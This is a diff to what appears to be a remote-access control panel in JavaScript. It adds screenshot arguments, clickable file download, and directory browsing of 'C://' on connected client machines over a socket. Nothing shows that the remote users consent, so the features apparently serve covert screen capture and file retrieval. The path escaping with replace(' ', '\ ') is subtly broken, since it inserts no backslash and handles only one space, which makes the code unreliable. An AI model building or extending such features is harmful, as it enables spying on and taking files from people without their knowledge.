@@ -45,6 +45,7 @@
       }
     });
 
+    let currPath;
     function sendoff(cl) {
       console.log('sendoff', cl);
       socket.emit('client:send', {sid: cl, cmd: 'off'});
@@ -62,14 +63,18 @@
 
     function screenshot(cl) {
       console.log('screenshot', cl);
-      socket.emit('client:send', {sid: cl, cmd: 'screenshot'});
+      socket.emit('client:send', {sid: cl, cmd: 'screenshot', args: 'screenshot.bmp'});
     }
 
-    let currPath;
+    function download(cl, name, path) {
+      console.log('download', cl);
+      socket.emit('client:send', {sid: cl, cmd: 'dw', args: {name: name, path: path.replace(' ', '\ ')}});
+    }
+
     function ls(cl, path) {
       currPath = path.indexOf('..') != -1  ? 'C://' : path;
       console.log('ls', cl, path);
-      socket.emit('client:send', {sid: cl, cmd: 'ls', args: currPath});
+      socket.emit('client:send', {sid: cl, cmd: 'ls', args: currPath.replace(' ', '\ ')});
     }
 
 
@@ -83,6 +88,7 @@
         el.html(f[i]);
         console.log(f[i][0]);
         if (f[i][0] == '.') el.on('click', () => ls(c, currPath + x + '/'));
+        else el.on('click', () => download(c, x, currPath + x));
 
         $tree.append(el);
       }
